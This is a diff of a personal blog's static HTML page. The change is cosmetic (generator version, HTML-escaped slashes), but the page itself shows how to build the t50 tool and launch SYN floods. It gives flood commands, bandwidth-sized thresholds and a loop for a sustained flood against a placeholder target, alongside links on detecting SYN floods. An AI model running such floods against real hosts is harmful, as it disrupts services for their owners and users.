@@ -6,7 +6,7 @@
 
 <meta name="author" content="Chase Pettet">
 <meta name="description" content="notes and useful(?) things">
-<meta name="generator" content="mynt v0.2.2">
+<meta name="generator" content="mynt v0.2.3">
 
 <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon">
 
@@ -101,13 +101,13 @@ function toggleDiv(divId) {
 </ol>
 <h4>Picking a tool</h4>
 <p>A tool that is simple to use is <a href="https://github.com/merces/t50">t50</a></p>
-<pre><code>git clone https://github.com/merces/t50.git
-cd t50/
+<pre><code>git clone https:&#47;&#47;github.com&#47;merces&#47;t50.git
+cd t50&#47;
 make
-./t50 --help
+.&#47;t50 --help
 </code></pre>
 <p>Now you have a compiled attack tool and the help is pretty large.  </p>
-<h4>Launching a SYN Flood</h4><pre><code>./t50 &lt;DEST_IP&gt; --flood -S --turbo
+<h4>Launching a SYN Flood</h4><pre><code>.&#47;t50 &lt;DEST_IP&gt; --flood -S --turbo
 </code></pre><h4>Looks like</h4>
 <p>Start:</p>
 <pre><code>entering in flood mode...
@@ -190,12 +190,12 @@ hit CTRL+C to break.
 </ul>
 
 <p>Guidance on size of flood:</p>
-<pre><code>./t50 &lt;target&gt; --threshold 10000 -S #4Mbps
-./t50 &lt;target&gt; --threshold 20000 -S #8Mbps
-./t50 &lt;target&gt; --threshold 40000 -S #16Mbps
+<pre><code>.&#47;t50 &lt;target&gt; --threshold 10000 -S #4Mbps
+.&#47;t50 &lt;target&gt; --threshold 20000 -S #8Mbps
+.&#47;t50 &lt;target&gt; --threshold 40000 -S #16Mbps
 
 #more or less consisten 4Mbps flood
-for i in {1..100}; do ./t50 &lt;target&gt; --threshold 10000 -S; sleep 3; done
+for i in {1..100}; do .&#47;t50 &lt;target&gt; --threshold 10000 -S; sleep 3; done
 </code></pre><h4>Reference:</h4>
 <p><a href="http://antmeetspenguin.blogspot.com/2011/01/detecting-and-preventing-syn-flood.html">dealing with syn flood blog post</a><br>
 <a href="http://www.sans.org/security-resources/idfaq/syn_flood.php">sans on syn flood</a><br>
